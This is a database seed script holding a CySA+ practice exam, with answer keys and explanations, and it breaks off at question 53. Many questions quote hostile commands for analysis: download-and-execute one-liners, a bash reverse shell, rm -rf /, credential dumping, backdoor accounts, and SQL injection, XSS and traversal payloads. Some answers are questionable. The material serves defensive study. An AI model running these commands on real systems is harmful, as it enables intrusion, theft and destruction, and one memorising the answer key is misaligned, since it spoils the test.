db.tests.insertOne({
  "category": "cysa",
  "testId": 7,
  "testName": "CySa+ Practice Test #7 (Challenging)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "Given the following SIEM log output, what is the MOST likely security event occurring?\n\nFeb 22 12:43:12 webserver1 sshd[2945]: Failed password for invalid user admin from 192.168.1.102 port 51432 ssh2\nFeb 22 12:43:15 webserver1 sshd[2945]: Failed password for invalid user root from 192.168.1.102 port 51436 ssh2\nFeb 22 12:43:18 webserver1 sshd[2945]: Failed password for invalid user guest from 192.168.1.102 port 51440 ssh2",
      "options": [
        "A legitimate user entering incorrect credentials",
        "A brute-force attack attempt",
        "A vulnerability scan detecting SSH service",
        "A misconfigured SSH daemon rejecting valid users"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Multiple failed login attempts with different usernames in a short time suggest a brute-force attack.",
      "examTip": "Use fail2ban or account lockout policies to mitigate brute-force attacks."
    },
    {
      "id": 2,
      "question": "What is the FIRST step in analyzing a suspected malware sample?",
      "options": [
        "Execute the sample in a sandbox environment",
        "Perform static analysis using a disassembler",
        "Upload the sample to VirusTotal for scanning",
        "Check the file hash against known malware databases"
      ],
      "correctAnswerIndex": 3,
      "explanation": "Checking the file hash against malware databases helps determine if it's a known threat before execution.",
      "examTip": "Always verify a file’s hash before deeper analysis. Running unknown samples risks execution."
    },
    {
      "id": 3,
      "question": "You suspect a web application vulnerability. Which tool is BEST suited for identifying OWASP Top 10 issues?",
      "options": [
        "Nmap",
        "Burp Suite",
        "Wireshark",
        "Metasploit"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Burp Suite specializes in web application security and is effective for finding OWASP Top 10 vulnerabilities like XSS, SQL injection, and CSRF.",
      "examTip": "Use Burp Suite’s Intruder and Repeater tools for deeper vulnerability testing."
    },
    {
      "id": 4,
      "question": "Given the following PowerShell command, what is its purpose?\n\nInvoke-WebRequest -Uri \"http://malicious.example.com/payload.exe\" -OutFile \"C:\\Users\\Public\\payload.exe\"; Start-Process \"C:\\Users\\Public\\payload.exe\"",
      "options": [
        "Encrypts a file before exfiltration",
        "Downloads and executes a malicious payload",
        "Clears event logs to evade detection",
        "Sets up a scheduled task for persistence"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Invoke-WebRequest fetches a remote file, and Start-Process executes it. This is a common malware delivery technique.",
      "examTip": "Monitor PowerShell execution logs for suspicious activity like remote payload execution."
    },
    {
      "id": 5,
      "question": "A threat intelligence feed reports an APT is using a specific domain for command-and-control (C2). What is the BEST action to take?",
      "options": [
        "Add the domain to the SIEM watchlist",
        "Block the domain at the firewall and proxy servers",
        "Notify end-users to avoid the domain",
        "Conduct a full forensic analysis of all endpoints"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Blocking the domain prevents compromised hosts from communicating with the attacker's infrastructure.",
      "examTip": "Threat intelligence feeds help proactively block C2 communications."
    },
    {
      "id": 6,
      "question": "A network administrator discovers the following on a Windows system:\n\nC:\\Windows\\System32\\drivers\\etc\\hosts\n127.0.0.1   www.banklogin.com\n\nWhat is the MOST likely cause?",
      "options": [
        "DNS poisoning attack",
        "Malware modifying the hosts file",
        "Misconfigured DNS settings",
        "Legitimate entry for internal testing"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Malware often modifies the hosts file to redirect traffic to phishing sites or block security updates.",
      "examTip": "Monitor changes to the hosts file to detect potential infections."
    },
    {
      "id": 7,
      "question": "What does the following `tcpdump` output indicate?\n\n15:33:10.184848 IP 192.168.1.50 > 203.0.113.20: Flags [P.], seq 194:402, ack 1502, win 8192\n15:33:10.185022 IP 203.0.113.20 > 192.168.1.50: Flags [R], seq 1502, win 0",
      "options": [
        "Normal TCP traffic",
        "Port scanning attempt",
        "Command-and-control communication",
        "TCP reset attack"
      ],
      "correctAnswerIndex": 3,
      "explanation": "The RST flag in response to an established connection suggests a TCP reset attack, often used in session hijacking.",
      "examTip": "Monitor for unusual RST flags in `tcpdump` to detect potential attacks."
    },
    {
      "id": 8,
      "question": "A global organization discovers regional inconsistencies in how employees handle sensitive data, leading to potential compliance gaps. Which of the following governance actions BEST ensures consistent data classification across all regions?",
      "options": [
        "Implementing an automated data loss prevention solution with default settings",
        "Conducting bi-annual training sessions focusing on technology updates",
        "Establishing a standardized, organization-wide data classification policy and requiring each region to adopt it",
        "Restricting access to sensitive data only to those with department manager approval"
      ],
      "correctAnswerIndex": 2,
      "explanation": "A unified, formal data classification policy ensures that each region follows consistent guidelines for labeling and securing sensitive information. This governance-level directive mitigates inconsistent handling of data.",
      "examTip": "For global organizations, uniformity in policy application is critical to reduce compliance gaps and enforce consistent data protection."
    },
    {
      "id": 9,
      "question": "Executive leadership is concerned about repeated compliance violations tied to employee negligence. From a governance perspective, which of the following is the MOST strategic way to address and prevent future occurrences?",
      "options": [
        "Purchasing additional endpoint detection solutions for all user laptops",
        "Establishing a rigorous policy enforcement program supported by mandatory, trackable security awareness training",
        "Deploying a bug bounty program to identify organizational weaknesses",
        "Adding a new firewall segment for each department to isolate traffic"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Governance focuses on setting policies, ensuring their enforcement, and mandating security education. Tracking completion and comprehension of training helps reduce negligence-related violations.",
      "examTip": "Long-term compliance improvement often hinges on robust governance measures: well-defined policies, enforced procedures, and comprehensive employee training."
    },
    {
      "id": 20,
      "question": "A financial services firm wants to proactively address potential audit findings related to governance lapses. Which of the following actions will MOST effectively reduce the likelihood of negative audit outcomes in the long term?",
      "options": [
        "Instruct all departments to comply with every global standard, even if some standards do not apply to their operations.",
        "Establish an internal continuous control monitoring (CCM) program to detect governance and compliance issues early.",
        "Swap internal audit teams every six months to ensure they do not develop familiarity with specific departments.",
        "Immediately penalize departments that fail any aspect of compliance testing, regardless of mitigation attempts."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A continuous control monitoring (CCM) program identifies governance issues in real time, enabling rapid remediation. Arbitrarily adopting all standards or rotating audit teams does not necessarily target root causes of governance lapses and can increase overhead.",
      "examTip": "Ongoing oversight and immediate remediation, rather than sporadic checks, are key to effective, long-term compliance management."
    },
    {
      "id": 11,
      "question": "A cybersecurity analyst detects unusual DNS queries from a workstation. The DNS logs show:\n\n`Feb 23 10:12:34 Workstation1 dnsmasq[2114]: query[A] randomstring1234.example.com from 192.168.1.50`\n`Feb 23 10:12:35 Workstation1 dnsmasq[2114]: query[A] anotherstrangequery.example.com from 192.168.1.50`\n\nWhat is the MOST likely explanation?",
      "options": [
        "A misconfigured DNS resolver",
        "A legitimate software update request",
        "A command-and-control (C2) beaconing attempt",
        "A local web application testing its DNS resolution"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The presence of unusual domain names in DNS queries, especially with randomized subdomains, is a strong indicator of malware communicating with a command-and-control server.",
      "examTip": "Monitor DNS queries for anomalous patterns such as frequent requests to random or algorithmically generated domains."
    },
    {
      "id": 12,
      "question": "An analyst is investigating a security incident and finds the following encoded PowerShell command in the system logs:\n\n`powershell.exe -Enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAYwBtAGQALgBlAHhlACcA`\n\nWhat is the BEST way to analyze this command?",
      "options": [
        "Manually decode the command by replacing characters",
        "Run it in an isolated sandbox environment",
        "Use a PowerShell decoder such as CyberChef or base64 decoding tools",
        "Execute the command on a test machine to observe its behavior"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The `-Enc` flag in PowerShell indicates Base64 encoding, and tools like CyberChef or `certutil -decode` can safely decode it without executing malicious commands.",
      "examTip": "Never execute unknown commands directly—always decode and analyze them statically first."
    },
    {
      "id": 13,
      "question": "During a penetration test, an attacker runs the following command:\n\n`curl -X POST -d \"username=admin'--&password=anything\" http://target.com/login`\n\nWhat type of vulnerability is being exploited?",
      "options": [
        "Command injection",
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Remote code execution"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The use of `admin'--` suggests a SQL injection attack, where the single quote (`'`) closes the intended SQL statement and `--` comments out the rest, potentially bypassing authentication.",
      "examTip": "Use parameterized queries or prepared statements to mitigate SQL injection attacks."
    },
    {
      "id": 14,
      "question": "A security analyst notices that a company’s SIEM system is detecting multiple failed login attempts followed by a successful login from the same user account. What attack technique does this MOST likely indicate?",
      "options": [
        "Brute-force attack",
        "Pass-the-hash attack",
        "Credential stuffing attack",
        "Privilege escalation"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Credential stuffing attacks use leaked username-password combinations across multiple accounts. The failed logins indicate an automated attempt, followed by success when valid credentials are found.",
      "examTip": "Enforce multi-factor authentication (MFA) to mitigate credential stuffing attacks."
    },
    {
      "id": 15,
      "question": "Which of the following BEST describes the purpose of the MITRE ATT&CK framework?",
      "options": [
        "It provides a structured list of known malware signatures",
        "It classifies network-based threats for firewall rules",
        "It categorizes and maps adversary tactics, techniques, and procedures (TTPs)",
        "It identifies physical security threats to an organization"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The MITRE ATT&CK framework is a globally recognized framework that maps adversary behaviors using Tactics, Techniques, and Procedures (TTPs).",
      "examTip": "Use MITRE ATT&CK to improve threat detection, hunting, and response strategies."
    },
    {
      "id": 16,
      "question": "Which of the following BEST describes a compensating control in vulnerability management?",
      "options": [
        "A control that prevents a vulnerability from being exploited",
        "A temporary measure implemented when a vulnerability cannot be immediately fixed",
        "A security measure that completely eliminates the vulnerability",
        "A patch deployed to remediate a security weakness"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Compensating controls are temporary security measures used when direct remediation (such as patching) is not possible due to operational constraints.",
      "examTip": "Use compensating controls such as firewall rules or monitoring until a permanent fix can be applied."
    },
    {
      "id": 17,
      "question": "A cybersecurity analyst observes multiple outbound connections to IP addresses known for hosting malicious content. Which action should be taken FIRST?",
      "options": [
        "Block outbound traffic to those IP addresses",
        "Quarantine the affected systems and conduct forensic analysis",
        "Notify the network administrator to investigate further",
        "Ignore the connections as they might be false positives"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Blocking outbound traffic to known malicious IPs helps contain a potential compromise and prevent data exfiltration.",
      "examTip": "Use threat intelligence feeds to update firewall and proxy rules against known bad IPs."
    },
    {
      "id": 18,
      "question": "A security operations center (SOC) is implementing a solution that can detect and respond to threats in real-time while also automating responses. Which tool is BEST suited for this purpose?",
      "options": [
        "SIEM (Security Information and Event Management)",
        "SOAR (Security Orchestration, Automation, and Response)",
        "NIDS (Network Intrusion Detection System)",
        "Packet capture analysis tool"
      ],
      "correctAnswerIndex": 1,
      "explanation": "SOAR platforms enable automated response, threat intelligence integration, and workflow orchestration to improve incident handling.",
      "examTip": "Use SOAR to automate repetitive tasks, reduce analyst workload, and improve response times."
    },
    {
      "id": 19,
      "question": "Which technique would be MOST effective for an attacker trying to escalate privileges on a Windows system?",
      "options": [
        "Pass-the-hash attack",
        "Exploiting a misconfigured sudoers file",
        "Kerberoasting",
        "Cross-site scripting"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Kerberoasting allows attackers to steal service account credentials from memory and crack them offline to escalate privileges.",
      "examTip": "Enforce strong Kerberos ticket encryption and service account password policies to mitigate Kerberoasting attacks."
    },
    {
      "id": 20,
      "question": "Which of the following is a common post-exploitation persistence technique?",
      "options": [
        "Using PowerShell Empire to create scheduled tasks",
        "Running an Nmap scan to detect open ports",
        "Dumping LSASS memory to extract credentials",
        "Uploading a rootkit to VirusTotal"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Scheduled tasks are commonly used for maintaining persistence on compromised systems.",
      "examTip": "Monitor Windows Task Scheduler for unauthorized scheduled tasks as part of threat detection."
    },
    {
      "id": 21,
      "question": "A security analyst reviews an Apache web server log and finds the following entry:\n\n192.168.1.45 - - [23/Feb/2025:14:12:00 +0000] \"GET /index.php?id=1%20OR%201=1-- HTTP/1.1\" 200 5120\n\nWhat type of attack is being attempted?",
      "options": [
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Command injection",
        "Local file inclusion (LFI)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The payload contains '1=1--', a common SQL injection attempt to bypass authentication by modifying SQL queries.",
      "examTip": "Use input validation and prepared statements to prevent SQL injection attacks."
    },
    {
      "id": 22,
      "question": "A security operations center (SOC) receives an alert that a workstation is making repeated outbound requests to `hxxp://malicious-site[.]com/update.exe`. What is the BEST immediate response?",
      "options": [
        "Block the domain on the firewall and proxy",
        "Isolate the workstation from the network",
        "Perform memory analysis on the workstation",
        "Reboot the workstation to clear any active malware"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Isolating the workstation prevents further network communication and limits potential damage while forensic analysis is conducted.",
      "examTip": "Always isolate compromised hosts before performing further investigation."
    },
    {
      "id": 23,
      "question": "A cybersecurity analyst is reviewing logs and notices an unusually high number of failed login attempts followed by a successful login from an IP address geolocated in a different country than the user’s normal location. What is the MOST likely attack method used?",
      "options": [
        "Brute-force attack",
        "Credential stuffing",
        "Pass-the-hash attack",
        "Session hijacking"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Credential stuffing uses leaked username-password pairs to attempt logins on multiple services. The successful login after multiple failures suggests valid credentials were found.",
      "examTip": "Enforce multi-factor authentication (MFA) to mitigate credential stuffing attacks."
    },
    {
      "id": 24,
      "question": "During a forensic investigation, an analyst finds the following command executed on a compromised Linux system:\n\n`rm -rf / --no-preserve-root`\n\nWhat impact does this command have?",
      "options": [
        "Deletes all files on the system irreversibly",
        "Creates a new root user with elevated privileges",
        "Overwrites the master boot record (MBR)",
        "Disables all user accounts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `rm -rf / --no-preserve-root` command forcefully deletes all files from the root directory, essentially destroying the system.",
      "examTip": "Monitor shell history and restrict execution of dangerous commands with system policies."
    },
    {
      "id": 25,
      "question": "A penetration tester is attempting to gain persistence on a compromised Windows machine and executes the following command:\n\n`schtasks /create /sc onlogon /tn \"Updater\" /tr \"C:\\Users\\Public\\malware.exe\"`\n\nWhat does this command do?",
      "options": [
        "Creates a scheduled task to run malware at user login",
        "Deletes all user data at next system reboot",
        "Modifies firewall rules to allow reverse shell connections",
        "Creates a new hidden user with administrator privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `schtasks` command schedules a task to execute `malware.exe` every time the user logs in, ensuring persistence.",
      "examTip": "Monitor Windows Task Scheduler for unauthorized scheduled tasks."
    },
    {
      "id": 26,
      "question": "A security analyst is inspecting HTTP headers and notices the following response from a web application:\n\n`Set-Cookie: sessionID=xyz123; HttpOnly; Secure`\n\nWhat is the purpose of the `HttpOnly` and `Secure` flags?",
      "options": [
        "They prevent cross-site scripting (XSS) attacks",
        "They restrict cookie access to secure HTTPS channels and prevent client-side JavaScript access",
        "They encrypt session cookies at the browser level",
        "They disable cookie-based authentication"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The `Secure` flag ensures the cookie is only transmitted over HTTPS, while `HttpOnly` prevents JavaScript from accessing it, mitigating XSS attacks.",
      "examTip": "Always set `HttpOnly` and `Secure` flags on sensitive cookies to enhance security."
    },
    {
      "id": 27,
      "question": "An attacker gains access to a Linux system and runs the following command:\n\n`echo 'bash -i >& /dev/tcp/203.0.113.5/4444 0>&1' > /tmp/.backdoor.sh && chmod +x /tmp/.backdoor.sh && /tmp/.backdoor.sh`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Create a reverse shell connection to the attacker's machine",
        "Modify system logs to hide their activity",
        "Create a new administrative user",
        "Scan the local network for vulnerable hosts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command redirects a Bash shell to an attacker's IP address over TCP port 4444, effectively creating a reverse shell.",
      "examTip": "Monitor for unusual outbound connections and use endpoint security tools to detect reverse shells."
    },
    {
      "id": 28,
      "question": "Which of the following is the BEST way to prevent an attacker from successfully exploiting Kerberoasting?",
      "options": [
        "Enforce strong service account passwords and reduce their privileges",
        "Disable all Kerberos authentication on the network",
        "Use only NTLM authentication instead of Kerberos",
        "Enable anonymous authentication for service accounts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Kerberoasting relies on weak service account passwords. Enforcing strong passwords and minimizing privileges reduces the risk of compromise.",
      "examTip": "Regularly rotate service account passwords and monitor Kerberos ticket requests."
    },
    {
      "id": 29,
      "question": "An attacker sends the following email:\n\n`Subject: Urgent Action Required!\n\nDear User,\n\nYour account has been flagged for suspicious activity. Please verify your identity immediately by clicking the link below:\n\nhttp://secure-login[.]com-verification[.]xyz`\n\nWhat type of attack is this?",
      "options": [
        "Business email compromise (BEC)",
        "Spear phishing",
        "Whaling attack",
        "DNS poisoning"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The email uses urgency and a deceptive URL to trick the recipient into clicking, making it a spear-phishing attack.",
      "examTip": "Train employees to verify email links before clicking and report suspicious messages."
    },
    {
      "id": 30,
      "question": "A security analyst notices an unusually high number of DNS requests to domains with random alphanumeric characters. What is the MOST likely explanation?",
      "options": [
        "DNS tunneling for data exfiltration",
        "A misconfigured DNS resolver",
        "A distributed denial-of-service (DDoS) attack",
        "A routine cloud service performing load balancing"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Malware and attackers often use DNS tunneling to covertly exfiltrate data by encoding it in DNS queries.",
      "examTip": "Monitor DNS traffic for unusually frequent or randomized domain queries."
    },
    {
      "id": 31,
      "question": "A security analyst runs the following command on a Linux system:\n\n`find / -perm -4000 2>/dev/null`\n\nWhat is the purpose of this command?",
      "options": [
        "Identify files with world-writable permissions",
        "Find files with the setuid bit enabled",
        "Search for files owned by root",
        "List all open network connections"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The command searches for files with the setuid (`-4000`) permission, which can be used for privilege escalation.",
      "examTip": "Regularly audit setuid binaries to prevent privilege escalation attacks."
    },
    {
      "id": 32,
      "question": "A forensic investigator discovers the following Windows event log entry:\n\n`Event ID: 4624\nLogon Type: 10\nAccount Name: admin\nSource IP: 192.168.1.200`\n\nWhat does this log entry indicate?",
      "options": [
        "A failed login attempt due to incorrect credentials",
        "A remote interactive login via RDP",
        "A local administrator account logging in",
        "An unauthorized attempt to reset user credentials"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Logon Type 10 in Windows Event ID 4624 indicates a remote interactive login, typically via RDP.",
      "examTip": "Monitor RDP logins for unusual activity, especially from unexpected IP addresses."
    },
    {
      "id": 33,
      "question": "Which attack technique involves stealing an NTLM hash and using it to authenticate without cracking the password?",
      "options": [
        "Pass-the-hash (PtH) attack",
        "Kerberoasting",
        "Brute-force attack",
        "Golden ticket attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Pass-the-hash attacks allow attackers to authenticate using stolen NTLM hashes without needing the actual password.",
      "examTip": "Disable NTLM authentication where possible and use Kerberos with strong password policies."
    },
    {
      "id": 34,
      "question": "An attacker sends the following payload in a web form input field:\n\n`<script>alert('XSS');</script>`\n\nWhat type of attack is this?",
      "options": [
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Command injection",
        "Remote file inclusion (RFI)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The script tag attempts to execute JavaScript in the victim’s browser, characteristic of an XSS attack.",
      "examTip": "Use input validation and Content Security Policy (CSP) headers to prevent XSS."
    },
    {
      "id": 35,
      "question": "A cybersecurity analyst reviewing packet captures sees the following request:\n\n`GET /etc/passwd HTTP/1.1`\n\nWhat type of attack is being attempted?",
      "options": [
        "Directory traversal",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Denial-of-service (DoS)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The request attempts to access `/etc/passwd`, a common directory traversal attack to read sensitive files.",
      "examTip": "Use web application firewalls (WAFs) and input validation to prevent directory traversal attacks."
    },
    {
      "id": 36,
      "question": "A security analyst finds the following output in a SIEM report:\n\n`alert tcp any any -> any 445 (msg:\"Possible EternalBlue exploit attempt\"; flow:to_server,established; content:\"|90 90 90 90|\"; sid:2022555;)`\n\nWhat type of attack is this signature designed to detect?",
      "options": [
        "Privilege escalation",
        "Remote code execution",
        "Credential stuffing",
        "Cross-site request forgery (CSRF)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The presence of `|90 90 90 90|` (NOP sled) suggests a remote code execution attempt, specifically the EternalBlue exploit targeting SMB.",
      "examTip": "Keep SMB services patched and disable unnecessary network ports to prevent EternalBlue exploits."
    },
    {
      "id": 37,
      "question": "A threat intelligence feed reports that a new malware variant is using Domain Generation Algorithms (DGA) to avoid detection. How does this technique work?",
      "options": [
        "Encrypts command-and-control (C2) traffic with TLS",
        "Generates random-looking domain names for C2 communication",
        "Uses legitimate cloud services to hide C2 traffic",
        "Hides malware inside steganographic images"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Domain Generation Algorithms (DGA) create a large number of random domains, making it harder to block command-and-control (C2) traffic.",
      "examTip": "Use DNS filtering and machine learning-based anomaly detection to identify DGA domains."
    },
    {
      "id": 38,
      "question": "Which of the following best describes the purpose of a Canary Token in cybersecurity?",
      "options": [
        "A decoy file or credential designed to trigger an alert when accessed",
        "A software patch that prevents exploitation of known vulnerabilities",
        "A signature-based detection rule for a SIEM system",
        "An authentication token that provides temporary admin access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Canary Tokens are fake credentials, files, or services that trigger alerts when accessed by an attacker.",
      "examTip": "Deploy canary tokens in sensitive locations to detect unauthorized access."
    },
    {
      "id": 39,
      "question": "A security analyst notices a significant increase in outbound ICMP traffic. Which of the following is the MOST likely cause?",
      "options": [
        "ICMP-based exfiltration (Ping Tunnel)",
        "A normal network health check",
        "A brute-force attack attempt",
        "A Kerberos ticket request flood"
      ],
      "correctAnswerIndex": 0,
      "explanation": "ICMP-based exfiltration (also known as a Ping Tunnel) is a covert channel that attackers use to transfer data over ICMP packets.",
      "examTip": "Monitor for abnormal ICMP traffic patterns and consider restricting outbound ICMP if unnecessary."
    },
    {
      "id": 40,
      "question": "A penetration tester wants to check for open SMB shares on a network. Which command would be MOST effective?",
      "options": [
        "`nmap -p 445 --script smb-enum-shares <target>`",
        "`netstat -an | grep 445`",
        "`ipconfig /all`",
        "`telnet <target> 445`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Nmap command uses the `smb-enum-shares` script to enumerate SMB shares on the target system.",
      "examTip": "Use Nmap scripts to automate reconnaissance and vulnerability scanning efficiently."
    },
    {
      "id": 41,
      "question": "A security analyst notices an unfamiliar scheduled task running on a Windows server:\n\n`schtasks /query /fo LIST`\n\nOutput:\n\n`TaskName: \\\\MaliciousUpdate\nNext Run Time: 2/23/2025 03:00:00 AM\nTask To Run: C:\\Windows\\Temp\\backdoor.exe`\n\nWhat is the BEST course of action?",
      "options": [
        "Disable the task using `schtasks /delete`",
        "Investigate the backdoor.exe file and check system logs",
        "Reboot the server to clear scheduled tasks",
        "Ignore the entry as it may be a legitimate update"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Investigating the executable and checking logs ensures the full scope of compromise is understood before removal.",
      "examTip": "Regularly audit scheduled tasks for unauthorized entries to detect persistence mechanisms."
    },
    {
      "id": 42,
      "question": "A cybersecurity team detects the following Base64-encoded PowerShell command:\n\n`cG93ZXJzaGVsbCAtbm9wIC1jICd3Z2V0IGh0dHA6Ly9tYWxpY2lvdXMtc2l0ZS5jb20vbWFsd2FyZS5leGUn` \n\nWhich action should the analyst take FIRST?",
      "options": [
        "Decode the Base64 string and analyze its intent",
        "Execute the command in a sandbox",
        "Report it to the security team without further analysis",
        "Ignore it unless an endpoint shows active compromise"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 string reveals the actual command, which is crucial for understanding its intent before taking further action.",
      "examTip": "Use tools like CyberChef or `echo <string> | base64 -d` in Linux to safely decode Base64 strings."
    },
    {
      "id": 43,
      "question": "A penetration tester wants to escalate privileges on a Windows machine and executes the following command:\n\n`whoami /priv`\n\nWhich privilege should the tester look for to determine if SYSTEM-level access can be obtained?",
      "options": [
        "SeDebugPrivilege",
        "SeTimeZonePrivilege",
        "SeShutdownPrivilege",
        "SeChangeNotifyPrivilege"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`SeDebugPrivilege` allows a user to attach to and manipulate system processes, often leading to privilege escalation.",
      "examTip": "Monitor privilege changes and restrict unnecessary privileges to prevent abuse."
    },
    {
      "id": 44,
      "question": "An analyst detects an HTTP request containing the following:\n\n`User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\"\nReferer: javascript:alert('XSS')`\n\nWhat type of attack is being attempted?",
      "options": [
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Command injection",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The attacker is injecting JavaScript into the `Referer` field, attempting a reflected XSS attack.",
      "examTip": "Use input validation and Content Security Policy (CSP) headers to mitigate XSS attacks."
    },
    {
      "id": 45,
      "question": "A security analyst notices multiple DNS queries to domains such as:\n\n`aj2k3sd9.example.com`\n`xj81adlk.example.com`\n`pqr5zmn1.example.com`\n\nWhat is the MOST likely explanation?",
      "options": [
        "Domain Generation Algorithm (DGA) malware",
        "A benign cloud service generating temporary subdomains",
        "A vulnerability scanner testing name resolution",
        "A misconfigured internal DNS server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Malware using Domain Generation Algorithms (DGA) frequently generates random subdomains for command-and-control (C2) communication.",
      "examTip": "Use DNS filtering and anomaly detection to identify and block DGA-based threats."
    },
    {
      "id": 46,
      "question": "An attacker successfully exploits a system and runs the following command:\n\n`net user /add backdoor P@ssw0rd123 && net localgroup administrators backdoor /add`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Creating a new user and adding it to the local administrators group",
        "Resetting the administrator password",
        "Modifying firewall rules to allow remote access",
        "Executing a denial-of-service attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command creates a new user (`backdoor`) and grants it administrative privileges for persistence.",
      "examTip": "Monitor user account changes and restrict administrative access to prevent unauthorized privilege escalation."
    },
    {
      "id": 47,
      "question": "A security analyst is reviewing a SIEM alert and finds the following suspicious command executed by an attacker:\n\n`wget -q -O - http://malicious.example.com/payload.sh | bash`\n\nWhat is the impact of this command?",
      "options": [
        "Downloads and executes a malicious script",
        "Sends encrypted data to a command-and-control server",
        "Injects malicious JavaScript into a web application",
        "Performs a directory traversal attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads a script from a remote server and pipes it directly into `bash` for execution, potentially compromising the system.",
      "examTip": "Use allowlists and restrict outgoing connections to prevent unauthorized downloads."
    },
    {
      "id": 48,
      "question": "Which of the following actions would BEST mitigate a Pass-the-Hash attack?",
      "options": [
        "Implementing multifactor authentication (MFA)",
        "Increasing the complexity of user passwords",
        "Using SHA-256 for password storage",
        "Allowing only NTLM authentication"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Pass-the-Hash exploits stolen hashed credentials, and MFA helps mitigate its effectiveness.",
      "examTip": "Use Kerberos authentication instead of NTLM and implement MFA for privileged accounts."
    },
    {
      "id": 49,
      "question": "A forensic investigator is analyzing a malware sample and notices that it frequently queries `169.254.169.254`. What does this indicate?",
      "options": [
        "An attempt to exploit AWS metadata services",
        "A DNS tunneling attempt",
        "A misconfigured DHCP lease request",
        "A loopback connection test"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The IP `169.254.169.254` is used by cloud providers (such as AWS) for metadata services, which attackers exploit for credential theft.",
      "examTip": "Restrict access to cloud metadata services and use IMDSv2 to mitigate exploitation."
    },
    {
      "id": 50,
      "question": "A security team detects an attacker attempting to access `/proc/kallsyms` on a Linux system. What is the MOST likely reason for this?",
      "options": [
        "The attacker is trying to enumerate kernel symbols for exploitation",
        "The attacker is searching for stored passwords",
        "The attacker is performing privilege escalation through SUID binaries",
        "The attacker is trying to clear system logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `/proc/kallsyms` file contains kernel symbols, which attackers can use to exploit vulnerabilities and escalate privileges.",
      "examTip": "Restrict access to `/proc/kallsyms` and enable kernel security features like KASLR."
    },
    {
      "id": 51,
      "question": "A security analyst captures the following suspicious traffic in a packet capture:\n\n```\n12:34:56.789 IP 192.168.1.100.4444 > 203.0.113.50.8080: Flags [S], seq 123456789, win 8192\n12:34:56.790 IP 203.0.113.50.8080 > 192.168.1.100.4444: Flags [S.], seq 987654321, ack 123456790, win 65535\n12:34:56.791 IP 192.168.1.100.4444 > 203.0.113.50.8080: Flags [A], ack 987654322, win 8192\n```\n\nWhat does this traffic pattern MOST likely indicate?",
      "options": [
        "Normal web browsing activity",
        "A reverse shell connection",
        "A brute-force attack",
        "A DNS exfiltration attempt"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The sequence shows an outbound connection from an internal host to an external IP over an unusual port, typical of a reverse shell.",
      "examTip": "Monitor outbound connections to detect reverse shells and unusual C2 activity."
    },
    {
      "id": 52,
      "question": "A penetration tester executes the following command on a compromised machine:\n\n`mimikatz privilege::debug sekurlsa::logonpasswords`\n\nWhat is the tester attempting to do?",
      "options": [
        "Dump cleartext credentials from memory",
        "Enumerate user accounts on the system",
        "Escalate privileges to SYSTEM",
        "Create a new backdoor user"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Mimikatz is used to dump stored credentials from memory, allowing attackers to steal plaintext passwords.",
      "examTip": "Enable Credential Guard and restrict debug privileges to prevent credential dumping."
    },
    {
      "id": 53,
      "question": "A cybersecurity analyst reviewing logs notices the following Apache access log entry:\n\n`192.168.1.50 - - [24/Feb/2025:10:15:42 +0000] \"GET /index.php?page=../../../../etc/shadow HTTP/1.1\" 200 5120`\n\nWhat type of attack is being attempted?",
      "options": [
        "SQL injection",
        "Directory traversal",
        "Cross-site scripting (XSS)",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 1,
